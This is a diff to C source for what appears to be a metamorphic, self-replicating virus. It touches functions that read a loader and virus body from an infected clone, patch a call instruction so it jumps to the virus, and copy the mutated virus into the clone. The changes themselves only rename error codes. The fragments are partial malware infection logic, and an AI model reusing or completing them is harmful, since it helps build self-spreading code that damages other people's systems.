@@ -23,7 +23,7 @@ static bool	init_loader_safe(struct safe_ptr *loader_ref, \
 {
 	void	*clone_loader = safe(clone_ref, loader_off, loader_size);
 
-	if (!clone_loader) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
+	if (!clone_loader) return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER);
 
 	loader_ref->ptr = clone_loader;
 	loader_ref->size = loader_size;
@@ -40,7 +40,7 @@ static bool	init_virus_safe(struct safe_ptr *virus_ref,           \
 	size_t	virus_size = full_virus_size - dist_virus_loader;
 	void	*clone_virus = safe(clone_ref, virus_off, virus_size);
 
-	if (!clone_virus) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
+	if (!clone_virus) return errors(ERR_VIRUS, _ERR_V_CANT_READ_VIRUS);
 
 	virus_ref->ptr = clone_virus;
 	virus_ref->size = virus_size;
@@ -58,7 +58,7 @@ static bool	init_virus_buffer_safe(struct safe_ptr *virus_buffer_ref, \
 	void	*ptr = sys_mmap(0, available_size, PROT_READ | PROT_WRITE,
 			MAP_ANON | MAP_PRIVATE, -1, 0);
 
-	if (ptr < 0) return errors(ERR_SYS, _ERR_MMAP_FAILED);
+	if (ptr < 0) return errors(ERR_SYS, _ERR_S_MMAP_FAILED);
 
 	virus_buffer_ref->ptr = ptr;
 	virus_buffer_ref->size = available_size;
@@ -72,7 +72,7 @@ static bool	get_clone_virus_address(void **clone_virus_address,
 	size_t	vircall_off = loader_off + dist_vircall_loader;
 	void	*clone_vircall = safe(clone_ref, vircall_off, CALL32_INST_SIZE);
 
-	if (!clone_vircall) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
+	if (!clone_vircall) return errors(ERR_VIRUS, _ERR_V_CANT_READ_VIRCALL);
 
 	int32_t	*clone_vircall_arg = clone_vircall + 1;
 	void	*clone_vircall_end = clone_vircall + CALL32_INST_SIZE;
@@ -96,7 +96,7 @@ static bool	set_clone_virus_call(struct safe_ptr clone_ref, \
 	size_t	vircall_off = loader_off + dist_vircall_loader;
 	void	*clone_vircall = safe(clone_ref, vircall_off, CALL32_INST_SIZE);
 
-	if (!clone_vircall) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
+	if (!clone_vircall) return errors(ERR_VIRUS, _ERR_V_CANT_READ_VIRCALL);
 
 	int32_t	*clone_vircall_arg = clone_vircall + 1;
 
@@ -113,7 +113,7 @@ static bool	copy_virus_buffer_to_clone(struct safe_ptr clone_ref, \
 
 	void	*clone_virus = safe(clone_ref, virus_off, virus_buffer_size);
 
-	if (!clone_virus) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
+	if (!clone_virus) return errors(ERR_VIRUS, _ERR_V_CANT_READ_VIRUS);
 
 	memcpy(clone_virus, virus_buffer_ref.ptr, virus_buffer_size);
 
@@ -156,7 +156,7 @@ bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_off, \
 	|| !true)
 	{
 		free_accessor(&virus_buffer_ref);
-		return errors(ERR_THROW, _ERR_METAMORPH_SELF);
+		return errors(ERR_THROW, _ERR_T_METAMORPH_CLONE);
 	}
 	free_accessor(&virus_buffer_ref);
 
